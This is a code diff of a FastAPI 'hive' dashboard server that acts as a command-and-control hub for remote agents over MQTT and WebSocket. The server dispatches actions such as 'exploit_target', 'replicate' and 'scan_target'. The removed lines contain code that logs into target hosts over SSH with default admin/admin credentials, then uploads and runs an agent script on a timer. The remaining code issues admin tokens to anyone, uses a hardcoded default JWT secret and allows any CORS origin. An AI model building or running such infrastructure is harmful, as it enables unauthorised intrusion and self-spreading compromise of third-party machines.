@@ -1,8 +1,11 @@
+# server.py - Throng Hive Dashboard (Final Version)
+
 from fastapi import FastAPI, WebSocket, HTTPException, Depends, Request
 from fastapi.responses import HTMLResponse
 from fastapi.templating import Jinja2Templates
 from fastapi.security import HTTPBearer, HTTPAuthorizationCredentials
 from fastapi.staticfiles import StaticFiles
+from fastapi.middleware.cors import CORSMiddleware
 import sqlite3
 import json
 import time
@@ -20,16 +23,27 @@ import threading
 import logging
 import socket
 
+# ============ SETUP ============
 app = FastAPI()
+
+# Middleware
+app.add_middleware(
+    CORSMiddleware,
+    allow_origins=["*"],
+    allow_credentials=True,
+    allow_methods=["*"],
+    allow_headers=["*"],
+)
+
 app.mount("/static", StaticFiles(directory="static"), name="static")
 templates = Jinja2Templates(directory="templates")
 security = HTTPBearer()
 
-# Logging setup
+# Logging
 logging.basicConfig(level=logging.INFO)
 logger = logging.getLogger(__name__)
 
-# Ambil konfigurasi dari variabel lingkungan dengan default
+# ============ CONFIG ============
 JWT_SECRET = os.getenv("JWT_SECRET", "throng_default_secret_1234567890")
 JWT_ALGORITHM = "HS256"
 MQTT_BROKER = os.getenv("MQTT_BROKER", "5374fec8494a4a24add8bb27fe4ddae5.s1.eu.hivemq.cloud:8883")
@@ -40,18 +54,10 @@ PROJECT_ID = os.getenv("RAILWAY_PROJECT_ID", "")
 DEFAULT_SPAWN_TARGET = os.getenv("DEFAULT_SPAWN_TARGET", "192.168.1.10")
 DEFAULT_SSH_USERNAME = os.getenv("DEFAULT_SSH_USERNAME", "admin")
 DEFAULT_SSH_PASSWORD = os.getenv("DEFAULT_SSH_PASSWORD", "admin")
-AUTO_SPAWN_INTERVAL = int(os.getenv("AUTO_SPAWN_INTERVAL", "300"))  # Dalam detik
+AUTO_SPAWN_INTERVAL = int(os.getenv("AUTO_SPAWN_INTERVAL", "300"))
 GITHUB_REPO = os.getenv("GITHUB_REPO", "username/throng")
 
-# Model untuk perintah
-class Command(BaseModel):
-    agent_id: str
-    action: str
-    target: str = None
-    params: dict = {}
-    emergency: bool = False
-
-# Inisialisasi database SQLite dengan caching
+# ============ DB ============
 db_connection = sqlite3.connect("throng.db", check_same_thread=False)
 db_cursor = db_connection.cursor()
 
@@ -70,10 +76,9 @@ def init_db():
 
 init_db()
 
-# MQTT client dengan pooling
+# ============ MQTT ============
 mqtt_client = mqtt.Client(callback_api_version=mqtt.CallbackAPIVersion.VERSION2)
 active_websockets = []
-mqtt_pool = []
 
 def on_connect(client, userdata, flags, rc, properties=None):
     logger.info(f"MQTT connected with result code {rc}")
@@ -82,180 +87,109 @@ def on_connect(client, userdata, flags, rc, properties=None):
 
 def on_message(client, userdata, msg):
     if msg.topic == "throng/reports":
-        report = json.loads(msg.payload.decode())
-        for ws in active_websockets:
-            try:
+        try:
+            report = json.loads(msg.payload.decode())
+            for ws in active_websockets:
                 ws.send_text(json.dumps({"type": "report", "data": report}))
-            except:
-                active_websockets.remove(ws)
+        except Exception as e:
+            logger.error(f"Error broadcasting MQTT message: {e}")
 
 mqtt_client.on_connect = on_connect
 mqtt_client.on_message = on_message
 mqtt_client.tls_set()
 mqtt_client.username_pw_set(MQTT_USERNAME, MQTT_PASSWORD)
-mqtt_client.connect(MQTT_BROKER.split(":")[0], int(MQTT_BROKER.split(":")[1]), 60)
-time.sleep(1)
+broker, port = MQTT_BROKER.split(":")
+mqtt_client.connect(broker, int(port), 60)
 mqtt_client.loop_start()
 
-# Model Isolation Forest
+# ============ MODEL ============
 anomaly_model = IsolationForest(contamination=0.1, random_state=42)
 
-# Analisis ancaman
 def analyze_threats(reports):
-    data = [[report["data"].get("network_traffic", 0), len(report["data"].get("vulnerability", []))] for report in reports]
+    data = [[r["data"].get("network_traffic", 0), len(r["data"].get("vulnerability", []))] for r in reports]
     if len(data) < 2:
         return []
     predictions = anomaly_model.fit_predict(np.array(data))
     return [1 if pred == -1 else 0 for pred in predictions]
 
-# Autentikasi JWT
+# ============ AUTH ============
 async def verify_token(credentials: HTTPAuthorizationCredentials = Depends(security)):
     try:
         payload = jwt.decode(credentials.credentials, JWT_SECRET, algorithms=[JWT_ALGORITHM])
         return payload
     except jwt.PyJWTError:
-        raise HTTPException(status_code=401, detail="Invalid token")
+        raise HTTPException(status_code=401, detail="Invalid or expired token")
 
-# Fungsi spawn agent otomatis via SSH
-def spawn_agent_ssh(target, credentials):
-    try:
-        new_agent_id = str(uuid.uuid4())
-        ssh = paramiko.SSHClient()
-        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
-        ssh.connect(target, username=credentials.get("username", DEFAULT_SSH_USERNAME), password=credentials.get("password", DEFAULT_SSH_PASSWORD))
-        sftp = ssh.open_sftp()
-        sftp.put("agent.py", f"/tmp/agent_{new_agent_id}.py")
-        ssh.exec_command(f"python3 /tmp/agent_{new_agent_id}.py &")
-        sftp.close()
-        ssh.close()
-        db_cursor.execute("INSERT INTO agents (agent_id, status, last_seen, ip, host) VALUES (?, ?, ?, ?, ?)", 
-                          (new_agent_id, "active", time.strftime("%Y-%m-%d %H:%M:%S"), socket.gethostbyname(target), target))
-        db_connection.commit()
-        logger.info(f"Spawned agent {new_agent_id} on {target}")
-        return new_agent_id
-    except Exception as e:
-        logger.error(f"Error spawning agent: {e}")
-        return None
+# ============ ENDPOINTS ============
 
-# Fungsi spawn agent otomatis via Railway API
-def spawn_agent_railway():
-    if not RAILWAY_API_TOKEN or not PROJECT_ID:
-        logger.warning("Railway API Token or Project ID not set")
-        return
-    headers = {"Authorization": f"Bearer {RAILWAY_API_TOKEN}", "Content-Type": "application/json"}
-    data = {
-        "query": """
-        mutation createService($input: ServiceInput!) {
-            createService(input: $input) {
-                id
-            }
-        }
-        """,
-        "variables": {
-            "input": {
-                "projectId": PROJECT_ID,
-                "name": f"agent-{uuid.uuid4()}",
-                "sourceRepo": GITHUB_REPO,
-                "rootDirectory": "",
-                "startCommand": "python agent.py",
-                "env": [
-                    {"key": "MQTT_BROKER", "value": MQTT_BROKER},
-                    {"key": "MQTT_USERNAME", "value": MQTT_USERNAME},
-                    {"key": "MQTT_PASSWORD", "value": MQTT_PASSWORD}
-                ]
-            }
-        }
-    }
-    response = requests.post("https://backboard.railway.app/graphql/v2", headers=headers, json=data)
-    if response.status_code == 200:
-        logger.info("New agent spawned via Railway")
-    else:
-        logger.error(f"Error spawning agent: {response.text}")
-
-# Pemantauan otomatis dengan batching
-def auto_monitor():
-    while True:
-        db_cursor.execute("SELECT data FROM reports ORDER BY timestamp DESC LIMIT 10")
-        reports = [json.loads(row[0]) for row in db_cursor.fetchall()]
-        anomalies = analyze_threats(reports)
-        if any(anomalies) or len(reports) < 3:
-            target = DEFAULT_SPAWN_TARGET
-            credentials = {"username": DEFAULT_SSH_USERNAME, "password": DEFAULT_SSH_PASSWORD}
-            spawn_agent_ssh(target, credentials)
-            if RAILWAY_API_TOKEN and PROJECT_ID:
-                spawn_agent_railway()
-        time.sleep(AUTO_SPAWN_INTERVAL)
-
-threading.Thread(target=auto_monitor, daemon=True).start()
-
-# Endpoint untuk token
 @app.get("/token")
 async def get_token():
     payload = {"user": "admin", "exp": time.time() + 3600}
     token = jwt.encode(payload, JWT_SECRET, algorithm=JWT_ALGORITHM)
     return {"token": token}
 
-# Endpoint untuk data dashboard
 @app.get("/api/data", dependencies=[Depends(verify_token)])
 async def get_dashboard_data():
     db_cursor.execute("SELECT agent_id, status, last_seen, ip, host FROM agents WHERE status = 'active'")
-    agents = [{"agent_id": row[0], "status": row[1], "last_seen": row[2], "ip": row[3], "host": row[4]} for row in db_cursor.fetchall()]
+    agents = [{"agent_id": r[0], "status": r[1], "last_seen": r[2], "ip": r[3], "host": r[4]} for r in db_cursor.fetchall()]
+
     db_cursor.execute("SELECT target, vulnerability, status, timestamp, score FROM targets")
-    targets = [{"target": row[0], "vulnerability": json.loads(row[1]), "status": row[2], "timestamp": row[3], "score": row[4]} for row in db_cursor.fetchall()]
+    targets = [{"target": r[0], "vulnerability": json.loads(r[1]), "status": r[2], "timestamp": r[3], "score": r[4]} for r in db_cursor.fetchall()]
+
     db_cursor.execute("SELECT agent_id, data, timestamp FROM reports ORDER BY timestamp DESC LIMIT 100")
-    reports = [{"agent_id": row[0], "data": json.loads(row[1]), "timestamp": row[2]} for row in db_cursor.fetchall()]
-    db_cursor.execute("SELECT agent_id, action, details, timestamp FROM emergency_logs ORDER BY timestamp DESC LIMIT 100")
-    emergency_logs = [{"agent_id": row[0], "action": row[1], "details": json.loads(row[2]), "timestamp": row[3]} for row in db_cursor.fetchall()]
-    
+    reports = [{"agent_id": r[0], "data": json.loads(r[1]), "timestamp": r[2]} for r in db_cursor.fetchall()]
+
     anomalies = analyze_threats(reports)
-    for i, report in enumerate(reports):
-        report["data"]["is_anomaly"] = bool(anomalies[i])
-    
+    for i, r in enumerate(reports):
+        if i < len(anomalies):
+            r["data"]["is_anomaly"] = bool(anomalies[i])
+
+    db_cursor.execute("SELECT agent_id, action, details, timestamp FROM emergency_logs ORDER BY timestamp DESC LIMIT 100")
+    emergency_logs = [{"agent_id": r[0], "action": r[1], "details": json.loads(r[2]), "timestamp": r[3]} for r in db_cursor.fetchall()]
+
     network_data = {
         "nodes": [
             {"id": "hive", "label": "Hive", "group": "hive", "color": "#00b7eb"},
-            *[{"id": agent["agent_id"], "label": agent["agent_id"], "group": "agent", "color": "#00ff00"} for agent in agents],
-            *[{"id": target["target"], "label": target["target"], "group": "target", "color": "#ff0000" if target["score"] > 0.5 else "#cccccc"} for target in targets]
+            *[{"id": a["agent_id"], "label": a["agent_id"], "group": "agent", "color": "#00ff00"} for a in agents],
+            *[{"id": t["target"], "label": t["target"], "group": "target", "color": "#ff0000" if t["score"] > 0.5 else "#cccccc"} for t in targets]
         ],
         "edges": [
-            *[{"from": "hive", "to": agent["agent_id"]} for agent in agents],
-            *[{"from": agent["agent_id"], "to": target["target"]} for agent in agents for target in targets if target["status"] == "claimed"]
+            *[{"from": "hive", "to": a["agent_id"]} for a in agents],
+            *[{"from": a["agent_id"], "to": t["target"]} for a in agents for t in targets if t["status"] == "claimed"]
         ]
     }
-    
-    return {"agents": agents, "targets": targets, "reports": reports, "emergency_logs": emergency_logs, "network": network_data}
 
-# Endpoint untuk perintah
+    return {
+        "agents": agents,
+        "targets": targets,
+        "reports": reports,
+        "emergency_logs": emergency_logs,
+        "network": network_data
+    }
+
 @app.post("/command", dependencies=[Depends(verify_token)])
 async def send_command(command: Command):
-    allowed_actions = ["block_ip", "send_honeypot", "redirect_traffic", "spawn_agent", "replicate", "scan_target", "exploit_target"]
-    if command.action not in allowed_actions:
+    allowed = ["block_ip", "send_honeypot", "redirect_traffic", "spawn_agent", "replicate", "scan_target", "exploit_target"]
+    if command.action not in allowed:
         raise HTTPException(status_code=400, detail="Invalid action")
-    
+
+    # Simpan ke DB
     if command.target:
-        if command.action in ["block_ip", "send_honeypot", "redirect_traffic", "exploit_target"]:
-            db_cursor.execute("INSERT INTO counterattacks (agent_id, target, action) VALUES (?, ?, ?)", 
-                              (command.agent_id, command.target, command.action))
-        elif command.action == "scan_target":
-            db_cursor.execute("INSERT INTO targets (target, status, score) VALUES (?, ?, ?)", 
-                              (command.target, "pending", 0.0))
+        db_cursor.execute("INSERT INTO counterattacks (agent_id, target, action) VALUES (?, ?, ?)", 
+                          (command.agent_id, command.target, command.action))
         if command.emergency:
             db_cursor.execute("INSERT INTO emergency_logs (agent_id, action, details) VALUES (?, ?, ?)", 
                               (command.agent_id, command.action, json.dumps({"target": command.target, "params": command.params})))
-    if command.action == "spawn_agent" and command.target:
-        credentials = command.params.get("credentials", {"username": DEFAULT_SSH_USERNAME, "password": DEFAULT_SSH_PASSWORD})
-        new_agent_id = spawn_agent_ssh(command.target, credentials)
-        if new_agent_id:
-            db_cursor.execute("INSERT INTO agents (agent_id, status, last_seen, ip, host) VALUES (?, ?, ?, ?, ?)", 
-                              (new_agent_id, "active", time.strftime("%Y-%m-%d %H:%M:%S"), socket.gethostbyname(command.target), command.target))
     db_connection.commit()
 
+    # Kirim via MQTT
     mqtt_client.publish(f"throng/commands/{command.agent_id}", json.dumps(command.dict()))
     for ws in active_websockets:
         ws.send_text(json.dumps({"type": "command", "data": command.dict()}))
+
     return {"status": f"Command {command.action} sent to {command.agent_id}"}
 
-# WebSocket untuk real-time updates
+# ============ WebSocket ============
 @app.websocket("/ws")
 async def websocket_endpoint(websocket: WebSocket):
     await websocket.accept()
@@ -263,7 +197,6 @@ async def websocket_endpoint(websocket: WebSocket):
     try:
         while True:
             data = await websocket.receive_text()
-            logger.info(f"Received WebSocket data: {data}")
             report = json.loads(data)
             agent_id = report.get("agent_id")
             report_data = report.get("data")
@@ -276,24 +209,27 @@ async def websocket_endpoint(websocket: WebSocket):
                 db_cursor.execute("INSERT INTO targets (target, vulnerability, status, score) VALUES (?, ?, ?, ?)", 
                                   (report_data.get("target"), json.dumps(report_data.get("vulnerability")), "scanned", score))
             db_connection.commit()
-            logger.info(f"Database state - Agents: {db_cursor.execute('SELECT COUNT(*) FROM agents').fetchone()[0]}, Reports: {db_cursor.execute('SELECT COUNT(*) FROM reports').fetchone()[0]}")
-            await websocket.send_text(json.dumps({"type": "update", "data": {"agent_id": agent_id, "status": "active"}}))
+            logger.info(f"Agent {agent_id} reported. DB updated.")
     except Exception as e:
         logger.error(f"WebSocket error: {e}")
     finally:
-        active_websockets.remove(websocket)
+        if websocket in active_websockets:
+            active_websockets.remove(websocket)
 
-# Endpoint utama untuk render dashboard
+# ============ Dashboard ============
 @app.get("/", response_class=HTMLResponse)
 async def read_root(request: Request):
     logger.info(f"Rendering dashboard.html with version {int(time.time())}")
     return templates.TemplateResponse("dashboard.html", {"request": request, "version": int(time.time())})
 
-# Cleanup saat shutdown
+# ============ Health Check ============
+@app.get("/health")
+async def health():
+    return {"status": "ok", "time": time.time()}
+
+# ============ Cleanup ============
 import atexit
 @atexit.register
 def cleanup():
     db_connection.close()
     mqtt_client.loop_stop()
-    for ws in active_websockets:
-        ws.close()
